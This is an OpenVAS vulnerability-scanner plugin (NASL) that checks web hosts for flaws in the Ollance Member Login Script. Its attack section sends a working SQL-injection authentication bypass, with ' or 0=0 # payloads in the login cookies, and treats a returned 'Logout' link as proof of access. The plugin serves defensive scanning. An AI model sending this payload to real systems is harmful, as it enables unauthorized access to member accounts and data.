###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ollance_member_login_script_mult_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
#
# Ollance Member Login Script Multiple Vulnerabilities
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802302");
  script_version("$Revision: 7044 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-07-07 15:43:33 +0200 (Thu, 07 Jul 2011)");
  script_bugtraq_id(48529);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Ollance Member Login script Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17466/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to insert arbitrary
  HTML script code and bypass authentication to gain sensitive information.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Ollance Member Login script");
  script_tag(name : "insight" , value : "Multiple flaws are due to
  - An improper validation of user-supplied input to 'msg' parameter in the
  'add_member.php'.
  - An improper validation of user-supplied input to 'login.php'.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "The host is running Ollance Member Login script and is prone to
  multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

##Get Host name
host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/php-member-login", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item: dir +  "/login.php", port:port);

  ## Confirm the application
  if('Powered by <a'>< rcvRes && '>Ollance Member Login Script<' >< rcvRes)
  {
    ## Construct attack request
    req2 = string("GET ", dir, "/members/index.php", " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Cookie: LMUSERNAME=%27+or+0%3D0+%23;",
                  "LMPASSWORD=%27+or+0%3D0+%23;\r\n\r\n");

    ## Posting Exploit
    res = http_keepalive_send_recv(port:port, data:req2);

    ## Confirm the exploit
    if(">Logout<">< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);